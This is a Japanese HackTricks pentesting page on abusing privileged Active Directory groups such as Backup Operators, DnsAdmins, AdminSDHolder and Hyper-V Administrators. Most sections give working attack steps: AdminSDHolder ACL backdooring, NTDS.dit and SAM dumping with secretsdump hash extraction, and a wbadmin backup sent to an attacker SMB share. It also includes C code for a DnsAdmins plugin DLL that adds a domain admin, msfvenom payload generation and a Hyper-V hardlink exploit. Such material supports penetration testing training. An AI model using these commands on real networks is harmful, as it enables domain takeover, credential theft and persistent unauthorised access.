# 特権グループ

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ会社**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションです
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

## 管理特権を持つ既知のグループ

* **Administrators**
* **Domain Admins**
* **Enterprise Admins**

他にも、セキュリティ評価中に複数の攻撃ベクトルを連鎖させる際に役立つアカウントのメンバーシップとアクセストークンの特権があります。

## アカウントオペレーター <a href="#account-operators" id="account-operators"></a>

* ドメイン上で非管理者アカウントとグループを作成することができます
* DCにローカルでログインすることができます

グループの**メンバー**を取得する：
```powershell
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
ユーザーのメンバーシップを確認してください：

![](<../../.gitbook/assets/1 (2) (1) (1).png>)

しかし、新しいユーザーを追加することはまだ可能です：

![](../../.gitbook/assets/a2.png)

また、DC01にローカルでログインすることもできます：

![](../../.gitbook/assets/a3.png)

## AdminSDHolderグループ

**AdminSDHolder**オブジェクトのアクセス制御リスト（ACL）は、Active Directory内のすべての「保護されたグループ」およびそれらのメンバーに**権限をコピー**するために使用されます。保護されたグループには、Domain Admins、Administrators、Enterprise Admins、およびSchema Adminsなどの特権グループが含まれます。\
デフォルトでは、このグループのACLは「保護されたグループ」内にコピーされます。これは、これらの重要なグループへの意図的または偶発的な変更を防ぐために行われます。ただし、攻撃者が例えば通常のユーザーに完全な権限を与えるなど、AdminSDHolderグループのACLを変更した場合、このユーザーは保護されたグループ内のすべてのグループに対して完全な権限を持つことになります（1時間以内に）。\
そして、もし誰かがこのユーザーをDomain Adminsから削除しようとした場合、1時間以内にユーザーはグループに戻されます。

グループの**メンバー**を取得する：
```powershell
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
```
**AdminSDHolder** グループにユーザーを追加します:
```powershell
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
```
**Domain Admins** グループにユーザーが含まれているかどうかを確認します:
```powershell
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```
1時間待つのが嫌な場合は、PSスクリプトを使用して即座に復元することができます：[https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1)

[**詳細はired.teamを参照してください。**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)

## **AD Recycle Bin**

このグループには、削除されたADオブジェクトを読み取る権限があります。そこには興味深い情報が含まれているかもしれません。
```bash
#This isn't a powerview command, it's a feature from the AD management powershell module of Microsoft
#You need to be in the "AD Recycle Bin" group of the AD to list the deleted AD objects
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
### ドメインコントローラへのアクセス

現在のメンバーシップでは、DC上のファイルにアクセスできないことに注意してください：

![](../../.gitbook/assets/a4.png)

しかし、ユーザーが`Server Operators`に属している場合：

![](../../.gitbook/assets/a5.png)

状況が変わります：

![](../../.gitbook/assets/a6.png)

### 特権昇格 <a href="#backup-operators" id="backup-operators"></a>

[`PsService`](https://docs.microsoft.com/en-us/sysinternals/downloads/psservice)またはSysinternalsの`sc`を使用して、サービスの権限をチェックします。
```
C:\> .\PsService.exe security AppReadiness

PsService v2.25 - Service information and configuration utility
Copyright (C) 2001-2010 Mark Russinovich
Sysinternals - www.sysinternals.com

[...]

[ALLOW] BUILTIN\Server Operators
All
```
これにより、Server Operatorsグループが[SERVICE_ALL_ACCESS](https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights)アクセス権を持っていることが確認されました。これにより、このサービスに対して完全な制御が可能です。\
このサービスを悪用して、任意のコマンドを実行し特権をエスカレーションすることができます。

## Backup Operators <a href="#backup-operators" id="backup-operators"></a>

`Server Operators`に所属している場合と同様に、`Backup Operators`に所属している場合は、`DC01`ファイルシステムにアクセスできます。

これは、このグループがその**メンバー**に[**`SeBackup`**](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#sebackupprivilege-3.1.4)と[**`SeRestore`**](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#serestoreprivilege-3.1.5)の特権を付与しているためです。**SeBackupPrivilege**により、任意のフォルダをトラバースし、フォルダの内容をリストすることができます。これにより、他に権限が与えられていない場合でも、フォルダからファイルをコピーすることができます。ただし、ファイルをコピーするためには、フラグ[**FILE_FLAG_BACKUP_SEMANTICS**](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea)を使用する必要があります。したがって、特別なツールが必要です。

この目的のために、[**これらのスクリプト**](https://github.com/giuliano108/SeBackupPrivilege)**を使用できます。**

グループの**メンバー**を取得する：
```powershell
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### **ローカル攻撃**
```bash
# Import libraries
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
Get-SeBackupPrivilege # ...or whoami /priv | findstr Backup SeBackupPrivilege is disabled

# Enable SeBackupPrivilege
Set-SeBackupPrivilege
Get-SeBackupPrivilege

# List Admin folder for example and steal a file
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\\report.pdf c:\temp\x.pdf -Overwrite
```
### AD攻撃

例えば、直接ドメインコントローラのファイルシステムにアクセスすることができます：

![](../../.gitbook/assets/a7.png)

このアクセスを悪用して、ドメイン内のすべてのユーザーとコンピュータオブジェクトの**NTLMハッシュ**を取得するために、アクティブディレクトリデータベース**`NTDS.dit`**を**盗む**ことができます。

#### diskshadow.exeを使用してNTDS.ditをダンプする

[**diskshadow**](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow)を使用すると、**`C`ドライブ**と例えば`F`ドライブに**シャドウコピー**を作成することができます。その後、システムによって使用されていないため、このシャドウコピーから`NTDS.dit`ファイルを盗むことができます：
```
diskshadow.exe

Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC,  10/14/2020 10:34:16 AM

DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% F:
DISKSHADOW> end backup
DISKSHADOW> exit
```
ローカル攻撃と同様に、特権ファイル **`NTDS.dit`** をコピーすることができます。
```
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
別のファイルをコピーする方法は、[**robocopy**](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)**を使用することです**：
```
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
次に、簡単に**SYSTEM**と**SAM**を**盗む**ことができます：
```
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
ついに、**`NTDS.dit`** から**すべてのハッシュを取得**できます:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
#### NTDS.ditのダンプにwbadmin.exeを使用する

wbadmin.exeの使用方法は、diskshadow.exeと非常に似ています。wbadmin.exeユーティリティは、Windows Vista/Server 2008以降のバージョンに組み込まれたコマンドラインユーティリティです。

使用する前に、攻撃者のマシンで[**SMBサーバーのためのNTFSファイルシステムをセットアップ**](https://gist.github.com/manesec/9e0e8000446b966d0f0ef74000829801)する必要があります。

SMBサーバーのセットアップが完了したら、ターゲットマシンでSMBの資格情報をキャッシュする必要があります。
```
# cache the smb credential.
net use X: \\<AttackIP>\sharename /user:smbuser password

# check if working.
dir X:\
```
エラーがなければ、wbadmin.exeを使用してそれを悪用します。
```
# Start backup the system.
# In here, no need to use `X:\`, just using `\\<AttackIP>\sharename` should be ok.
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds

# Look at the backup version to get time.
wbadmin get versions

# Restore the version to dump ntds.dit.
echo "Y" | wbadmin start recovery -version:10/09/2023-23:48 -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```
もし成功すれば、`C:\ntds.dit`にダンプされます。

[IPPSECのデモビデオ](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s)

## DnsAdmins

**DNSAdmins**グループのメンバーまたは**DNSサーバー**オブジェクトへの**書き込み権限**を持つユーザーは、**DNSサーバー**上で**SYSTEM権限**で**任意のDLL**をロードすることができます。\
これは、**ドメインコントローラー**が非常に頻繁に**DNSサーバー**として使用されるため、非常に興味深いです。

この\*\*\*\*[**ポスト**](https://adsecurity.org/?p=4064)に示されているように、次の攻撃は、DNSがドメインコントローラー上で実行されている場合（非常に一般的です）に実行できます：

* DNS管理はRPC経由で行われます
* [**ServerLevelPluginDll**](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-dnsp/c9d38538-8827-44e6-aa5e-022a016ed723)を使用すると、**DLLのパスの検証がゼロ**でカスタム**DLL**を**ロード**することができます。これは、コマンドラインから`dnscmd`ツールを使用して行うことができます
* **`DnsAdmins`**グループのメンバーが以下の**`dnscmd`**コマンドを実行すると、`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll`レジストリキーが設定されます
* **DNSサービスが再起動**されると、このパスにある**DLL**が**ロード**されます（つまり、ドメインコントローラーのマシンアカウントがアクセスできるネットワーク共有）
* 攻撃者は、**カスタムDLLをロードしてリバースシェルを取得**したり、MimikatzのようなツールをDLLとしてロードして資格情報をダンプすることができます。

グループの**メンバー**を取得する：
```powershell
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### 任意のDLLの実行

次に、**DNSAdminsグループ**に所属するユーザーがいる場合、**DNSサーバーはSYSTEM特権で任意のDLLを読み込むことができます**（DNSサービスは`NT AUTHORITY\SYSTEM`として実行されます）。次のコマンドを実行することで、DNSサーバーは**ローカルまたはリモート**（SMBで共有された）DLLファイルを読み込むことができます。
```
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
```
有効なDLLの例は[https://github.com/kazkansouh/DNSAdmin-DLL](https://github.com/kazkansouh/DNSAdmin-DLL)にあります。`DnsPluginInitialize`関数のコードを以下のように変更します：
```c
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```
または、msfvenomを使用してdllを生成することもできます：
```bash
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
したがって、**DNSサービス**が開始または再起動されると、新しいユーザーが作成されます。

DNSAdminグループ内にユーザーがいても、**デフォルトではDNSサービスを停止および再起動することはできません。** ただし、常に次の操作を試すことができます:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
[**この特権昇格についての詳細は、ired.teamを参照してください。**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise)

#### Mimilib.dll

この[**投稿**](http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)で詳しく説明されているように、`Mimikatz`ツールの作成者による[**mimilib.dll**](https://github.com/gentilkiwi/mimikatz/tree/master/mimilib)を使用して、[**kdns.c**](https://github.com/gentilkiwi/mimikatz/blob/master/mimilib/kdns.c)ファイルを**変更**して、リバースシェルのワンライナーや他のコマンドを実行することも可能です。

### MitMのためのWPADレコード

DnsAdminsグループの特権を悪用する別の方法は、**WPADレコード**を作成することです。このグループに所属することで、[グローバルクエリブロックセキュリティを無効化](https://docs.microsoft.com/en-us/powershell/module/dnsserver/set-dnsserverglobalqueryblocklist?view=windowsserver2019-ps)する権限が与えられます。デフォルトでは、この攻撃をブロックするためにグローバルクエリブロックリストが使用されます。サーバー2008では、DNSサーバーにグローバルクエリブロックリストを追加する機能が初めて導入されました。デフォルトでは、Web Proxy Automatic Discovery Protocol (WPAD)とIntra-site Automatic Tunnel Addressing Protocol (ISATAP)がグローバルクエリブロックリストに含まれています。これらのプロトコルはハイジャックの脆弱性が非常に高く、任意のドメインユーザーがこれらの名前を含むコンピュータオブジェクトやDNSレコードを作成することができます。

**グローバルクエリブロックリストを無効化**し、**WPADレコードを作成**した後、デフォルト設定で動作しているすべてのWPADを実行しているマシンのトラフィックは、**攻撃マシンを介してプロキシされます**。[Responder](https://github.com/lgandx/Responder)や[Inveigh](https://github.com/Kevin-Robertson/Inveigh)などのツールを使用して、トラフィックのスプーフィングを行い、パスワードハッシュをキャプチャしてオフラインでクラックしたり、SMBRelay攻撃を実行したりすることができます。

{% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
[spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
{% endcontent-ref %}

## イベントログの読み取り者

[**イベントログの読み取り者**](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn579255\(v=ws.11\)?redirectedfrom=MSDN#event-log-readers)グループのメンバーは、生成されたイベントログ（新しいプロセス作成ログなど）に**アクセスする権限**を持っています。ログには**機密情報**が含まれている場合があります。ログの表示方法を見てみましょう：
```powershell
#Get members of the group
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Event Log Readers"

# To find "net [...] /user:blahblah password"
wevtutil qe Security /rd:true /f:text | Select-String "/user"
# Using other users creds
wevtutil qe Security /rd:true /f:text /r:share01 /u:<username> /p:<pwd> | findstr "/user"

# Search using PowerShell
Get-WinEvent -LogName security [-Credential $creds] | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
```
## Exchange Windows Permissions

メンバーはドメインオブジェクトに**DACLを書き込む権限**を与えられています。攻撃者はこれを悪用して、ユーザーに[**DCSync**](dcsync.md)の特権を与えることができます。\
Microsoft ExchangeがAD環境にインストールされている場合、このグループのメンバーとしてユーザーアカウントやコンピューターを見つけることが一般的です。

この[**GitHubリポジトリ**](https://github.com/gdedrouas/Exchange-AD-Privesc)では、このグループの権限を悪用して特権をエスカレーションするためのいくつかの**技術**が説明されています。
```powershell
#Get members of the group
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
## Hyper-V管理者

[**Hyper-V管理者**](https://docs.microsoft.com/ja-jp/windows/security/identity-protection/access-control/active-directory-security-groups#hyper-v-administrators)グループは、すべての[Hyper-V機能](https://docs.microsoft.com/ja-jp/windows-server/manage/windows-admin-center/use/manage-virtual-machines)に完全なアクセス権を持っています。**ドメインコントローラー**が**仮想化**されている場合、**仮想化管理者**は**ドメイン管理者**と見なされるべきです。彼らは簡単に**ライブドメインコントローラーのクローン**を作成し、仮想ディスクをオフラインで**マウント**して**`NTDS.dit`**ファイルを取得し、ドメイン内のすべてのユーザーのNTLMパスワードハッシュを抽出することができます。

また、この[ブログ](https://decoder.cloud/2020/01/20/from-hyper-v-admin-to-system/)で詳しく説明されているように、仮想マシンを**削除**すると、`vmms.exe`は対応する**`.vhdx`ファイル**の元のファイルアクセス許可を**NT AUTHORITY\SYSTEM**として**復元**しようとしますが、ユーザーを偽装しません。私たちは**`.vhdx`**ファイルを**削除**し、このファイルを**保護されたSYSTEMファイル**に向けるためのネイティブな**ハードリンク**を作成することができます。すると、完全なアクセス権が与えられます。

オペレーティングシステムが[CVE-2018-0952](https://www.tenable.com/cve/CVE-2018-0952)または[CVE-2019-0841](https://www.tenable.com/cve/CVE-2019-0841)に対して脆弱である場合、これを利用してSYSTEM特権を取得することができます。それ以外の場合、特権のないユーザーが起動できる**SYSTEMのコンテキストで実行されるサービスをインストールしているサーバー上のアプリケーションを利用**することができます。

### **攻撃例**

この例では、**Firefox**が**`Mozilla Maintenance Service`**をインストールしていることがあります。[このエクスプロイト](https://raw.githubusercontent.com/decoder-it/Hyper-V-admin-EOP/master/hyperv-eop.ps1)（NTハードリンクの概念証明）を更新して、現在のユーザーに以下のファイルの完全なアクセス権を付与することができます。
```bash
C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
```
#### **ファイルの所有権を取得する**

PowerShellスクリプトを実行した後、**このファイルの完全な制御権を持ち、所有権を取得することができるはずです**。
```bash
C:\htb> takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
```
#### **Mozillaメンテナンスサービスの開始**

次に、このファイルを**悪意のある`maintenanceservice.exe`**で置き換え、メンテナンスサービスを**開始**し、SYSTEMとしてコマンドの実行を行います。
```
C:\htb> sc.exe start MozillaMaintenance
```
{% hint style="info" %}
このベクトルは、ハードリンクに関連する動作を変更した2020年3月のWindowsセキュリティ更新によって軽減されました。
{% endhint %}

## 組織管理

このグループは、**Microsoft Exchange**がインストールされた環境でも存在します。\
このグループのメンバーは、**すべての**ドメインユーザーの**メールボックス**に**アクセス**できます。\
このグループはまた、グループ[**`Exchange Windows Permissions`**](privileged-groups-and-token-privileges.md#exchange-windows-permissions)を含むOU `Microsoft Exchange Security Groups`の**完全な制御**を持っています（このグループを悪用して特権昇格する方法についてはリンクを参照してください）。

## プリントオペレータ

このグループのメンバーには以下が付与されます：

* [**`SeLoadDriverPrivilege`**](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#seloaddriverprivilege-3.1.7)
* **ドメインコントローラにローカルでログオン**し、シャットダウンする権限
* ドメインコントローラに接続された**プリンタ**の**管理**、作成、共有、削除の権限

{% hint style="warning" %}
コマンド`whoami /priv`が昇格していないコンテキストで**`SeLoadDriverPrivilege`**を表示しない場合、UACをバイパスする必要があります。
{% endhint %}

グループの**メンバー**を取得する：
```powershell
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
このページでは、SeLoadDriverPrivilegeを悪用して特権昇格を行う方法について説明します：

{% content-ref url="../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/abuse-seloaddriverprivilege.md" %}
[abuse-seloaddriverprivilege.md](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/abuse-seloaddriverprivilege.md)
{% endcontent-ref %}

## リモートデスクトップユーザー

このグループのメンバーはRDP経由でPCにアクセスできます。\
グループの**メンバー**を取得する：
```powershell
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
**RDP**に関する詳細情報:

{% content-ref url="../../network-services-pentesting/pentesting-rdp.md" %}
[pentesting-rdp.md](../../network-services-pentesting/pentesting-rdp.md)
{% endcontent-ref %}

## リモート管理ユーザー

このグループのメンバーは**WinRM**を介してPCにアクセスできます。
```powershell
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
**WinRM**についての詳細情報は次のとおりです：

{% content-ref url="../../network-services-pentesting/5985-5986-pentesting-winrm.md" %}
[5985-5986-pentesting-winrm.md](../../network-services-pentesting/5985-5986-pentesting-winrm.md)
{% endcontent-ref %}

## サーバーオペレーター <a href="#server-operators" id="server-operators"></a>

このメンバーシップにより、ユーザーは以下の特権を持つドメインコントローラーを構成できます：

* ローカルでのログオンを許可する
* ファイルとディレクトリのバックアップ
* \`\`[`SeBackupPrivilege`](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#sebackupprivilege-3.1.4) および [`SeRestorePrivilege`](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#serestoreprivilege-3.1.5)
* システムの時刻の変更
* タイムゾーンの変更
* リモートシステムからの強制シャットダウン
* ファイルとディレクトリの復元
* システムのシャットダウン
* ローカルサービスの制御

グループの**メンバー**を取得する：
```powershell
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
## 参考文献 <a href="#references" id="references"></a>

{% embed url="https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges" %}

{% embed url="https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/" %}

{% embed url="https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory" %}

{% embed url="https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--" %}

{% embed url="https://adsecurity.org/?p=3658" %}

{% embed url="http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/" %}

{% embed url="https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/" %}

{% embed url="https://rastamouse.me/2019/01/gpo-abuse-part-1/" %}

{% embed url="https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13" %}

{% embed url="https://github.com/tandasat/ExploitCapcom" %}

{% embed url="https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp" %}

{% embed url="https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys" %}

{% embed url="https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e" %}

{% embed url="https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンやHackTricksのPDFをダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
* **ハッキングのトリックを共有するには、**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出**してください。

</details>
